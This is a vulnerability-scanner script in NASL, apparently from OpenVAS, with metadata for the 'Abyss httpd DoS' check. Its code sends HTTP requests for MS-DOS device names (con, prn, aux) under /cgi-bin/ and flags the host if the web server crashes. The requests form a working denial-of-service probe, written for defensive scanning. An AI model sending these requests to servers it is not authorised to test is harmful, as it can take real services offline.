if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15563" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_xref( name: "OSVDB", value: "11006" );
	script_tag( name: "cvss_base", value: "7.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:N/A:C" );
	script_name( "Abyss httpd DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your web server to the latest version." );
	script_tag( name: "summary", value: "It was possible to kill the web server by sending a MS-DOS device
  names in an HTTP request." );
	script_tag( name: "impact", value: "An attacker may use this flaw to prevent this host from performing its
  job properly." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port, retry: 4 )){
	exit( 0 );
}
for dev in make_list( "con",
	 "prn",
	 "aux" ) {
	req = NASLString( "GET /cgi-bin/", dev, " HTTP/1.0\\r\\n", "Host: ", get_host_ip(), "\\r\\n\\r\\n" );
	http_send_recv( port: port, data: req );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

